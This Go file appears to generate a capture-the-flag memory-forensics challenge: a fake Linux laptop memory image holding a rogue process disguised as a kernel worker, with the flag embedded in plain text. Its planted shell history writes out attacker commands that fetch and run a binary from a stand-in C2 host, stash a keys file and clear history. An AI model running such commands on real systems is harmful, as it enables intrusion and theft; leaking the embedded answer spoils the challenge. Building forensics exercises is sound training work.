package main

import (
	"bytes"
	"compress/gzip"
	"encoding/hex"
	"fmt"
	"strings"
)

// ---------------------------------------------------------------- Memory Lane
//
// A raw 32 MiB "memory image" of a Linux laptop: kernel messages, the
// /proc status of every process, their command lines and environments, and
// a shell history. One "kernel worker" has a parent of 1, a user, and a
// command line, which real kernel threads never have. Its environment holds
// the flag, XOR'd with the --key from its command line.

const (
	memSize  = 32 << 20
	pageSize = 4096
	rogueKey = "lane-7f3a"
	rogueC2  = "203.0.113.66:443"
)

type proc struct {
	name, state      string
	pid, ppid, uid   int
	cmdline, environ []string // nil for kernel threads
}

func memoryLane() {
	r := rng("memory-lane")
	mem := make([]byte, memSize)
	used := map[int]bool{}
	// put writes data at a free random page (some go mid-page, like real
	// allocations), and keeps the first few pages for the kernel banner.
	put := func(data []byte) {
		for {
			pg := 16 + r.IntN(memSize/pageSize-32)
			if used[pg] || used[pg+1] {
				continue
			}
			used[pg], used[pg+1] = true, true
			off := pg*pageSize + 64*r.IntN(16)
			copy(mem[off:], data)
			return
		}
	}

	// Some pages of noise, as freed memory looks.
	for i := 0; i < 48; i++ {
		noise := make([]byte, pageSize)
		_, _ = r.Read(noise)
		put(noise)
	}

	copy(mem[0x1000:], "Linux version 6.8.0-45-generic (buildd@lcy02-amd64-075) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0) #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2026\x00")
	put([]byte(strings.Join([]string{
		"[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-6.8.0-45-generic root=UUID=4f1c0b7e-2d1a-4c9e-9b67-0d5e3a0c2f11 ro quiet splash",
		"[    0.512331] ACPI: battery: Slot [BAT0] (battery present)",
		"[    2.104876] EXT4-fs (nvme0n1p2): mounted filesystem with ordered data mode.",
		"[    5.880142] wlp2s0: associated",
		"[ 8121.334510] audit: type=1400 apparmor=\"DENIED\" operation=\"exec\" profile=\"snap.firefox.firefox\" name=\"/dev/shm/.k/kworker\"",
		"[ 8123.902117] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.",
	}, "\n") + "\n"))

	user := []string{"HOME=/home/ines", "USER=ines", "SHELL=/bin/bash", "LANG=en_PH.UTF-8", "PATH=/usr/local/bin:/usr/bin:/bin", "XDG_SESSION_TYPE=wayland", "DISPLAY=:0"}
	procs := []proc{
		{"systemd", "S (sleeping)", 1, 0, 0, []string{"/sbin/init", "splash"}, []string{"HOME=/", "TERM=linux"}},
		{"kthreadd", "S (sleeping)", 2, 0, 0, nil, nil},
		{"rcu_preempt", "I (idle)", 15, 2, 0, nil, nil},
		{"kworker/0:1H", "I (idle)", 112, 2, 0, nil, nil},
		{"kworker/u8:0", "I (idle)", 201, 2, 0, nil, nil},
		{"kworker/u8:1", "I (idle)", 202, 2, 0, nil, nil},
		{"kworker/2:2", "I (idle)", 318, 2, 0, nil, nil},
		{"systemd-journal", "S (sleeping)", 402, 1, 0, []string{"/usr/lib/systemd/systemd-journald"}, []string{"LANG=C.UTF-8"}},
		{"systemd-udevd", "S (sleeping)", 455, 1, 0, []string{"/usr/lib/systemd/systemd-udevd"}, []string{"LANG=C.UTF-8"}},
		{"NetworkManager", "S (sleeping)", 790, 1, 0, []string{"/usr/sbin/NetworkManager", "--no-daemon"}, []string{"LANG=C.UTF-8"}},
		{"sshd", "S (sleeping)", 812, 1, 0, []string{"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"}, []string{"LANG=C.UTF-8"}},
		{"gdm3", "S (sleeping)", 1004, 1, 0, []string{"/usr/sbin/gdm3"}, []string{"LANG=en_PH.UTF-8"}},
		{"gnome-shell", "S (sleeping)", 1620, 1580, 1000, []string{"/usr/bin/gnome-shell"}, user},
		{"firefox", "S (sleeping)", 2311, 1620, 1000, []string{"/snap/firefox/4793/usr/lib/firefox/firefox"}, user},
		{"Isolated Web Co", "S (sleeping)", 2388, 2311, 1000, []string{"/snap/firefox/4793/usr/lib/firefox/firefox", "-contentproc", "-isForBrowser", "tab"}, user},
		{"gnome-terminal-", "S (sleeping)", 2950, 1620, 1000, []string{"/usr/libexec/gnome-terminal-server"}, user},
		{"bash", "S (sleeping)", 2961, 2950, 1000, []string{"bash"}, user},
		{"vim", "T (stopped)", 3302, 2961, 1000, []string{"vim", "thesis/chapter3.tex"}, user},
		{"kworker/u8:2", "I (idle)", 3410, 2, 0, nil, nil},
		{"kworker/u8:3", "S (sleeping)", 3477, 1, 1000,
			[]string{"/dev/shm/.k/kworker/u8:3", "--beacon", rogueC2, "--key", rogueKey},
			append(append([]string{}, user...), "STASH="+hex.EncodeToString(xorKey([]byte("flag{volatility_is_a_virtue}"), []byte(rogueKey))))},
		{"kworker/3:0", "I (idle)", 3502, 2, 0, nil, nil},
		{"pipewire", "S (sleeping)", 1702, 1580, 1000, []string{"/usr/bin/pipewire"}, user},
		{"cron", "S (sleeping)", 802, 1, 0, []string{"/usr/sbin/cron", "-f", "-P"}, []string{"LANG=C.UTF-8"}},
	}
	for _, p := range procs {
		put(fmt.Appendf(nil, "Name:\t%s\nUmask:\t0022\nState:\t%s\nTgid:\t%d\nNgid:\t0\nPid:\t%d\nPPid:\t%d\nTracerPid:\t0\nUid:\t%d\t%d\t%d\t%d\nGid:\t%d\t%d\t%d\t%d\nThreads:\t1\n",
			p.name, p.state, p.pid, p.pid, p.ppid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid))
		if p.cmdline != nil {
			put([]byte(strings.Join(p.cmdline, "\x00") + "\x00"))
			put([]byte(strings.Join(p.environ, "\x00") + "\x00\x00"))
		}
	}
	put([]byte(strings.Join([]string{
		"cd ~/thesis",
		"git pull",
		"vim chapter3.tex",
		"mkdir -p /dev/shm/.k/kworker",
		"curl -s http://" + strings.Split(rogueC2, ":")[0] + "/u -o /dev/shm/.k/kworker/u8:3",
		"chmod +x /dev/shm/.k/kworker/u8:3",
		"STASH=$(./stash.sh ~/Documents/keys.txt) /dev/shm/.k/kworker/u8:3 --beacon " + rogueC2 + " --key " + rogueKey + " &",
		"rm stash.sh",
		"history -c",
	}, "\n") + "\n"))

	var gz bytes.Buffer
	zw, _ := gzip.NewWriterLevel(&gz, gzip.BestCompression)
	zw.Name = "memory.raw" // no ModTime, so every run writes the same bytes
	_, _ = zw.Write(mem)
	_ = zw.Close()
	write("memory-lane/dist/memory.raw.gz", gz.Bytes())
}

func xorKey(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}
